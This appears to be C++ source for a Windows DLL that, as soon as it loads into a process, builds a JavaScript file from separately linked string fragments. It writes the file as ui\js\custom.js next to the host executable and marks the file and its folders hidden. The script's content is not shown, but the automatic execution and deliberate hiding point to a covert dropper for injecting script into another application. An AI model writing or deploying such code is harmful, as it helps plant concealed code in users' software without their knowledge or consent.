#include <Windows.h>
#include <fstream>
#include <string>
#include <Shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

// Автоматически подключится при сборке
extern "C" const char* js_parts[];
extern "C" const int js_parts_count;

std::string GetFullJS() {
    std::string result;
    for (int i = 0; i < js_parts_count; ++i) {
        result += js_parts[i];
    }
    return result;
}

void WriteHiddenFile(const char* path, const std::string& content) {
    std::ofstream f(path, std::ios::binary);
    f.write(content.c_str(), content.size());
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        PathRemoveFileSpecA(path);

        std::string uiPath = std::string(path) + "\\ui";
        std::string assetsPath = uiPath + "\\js";
        
        CreateDirectoryA(uiPath.c_str(), NULL);
        CreateDirectoryA(assetsPath.c_str(), NULL);
        
        WriteHiddenFile((assetsPath + "\\custom.js").c_str(), GetFullJS());
        
        SetFileAttributesA(uiPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
        SetFileAttributesA(assetsPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
    return TRUE;
}
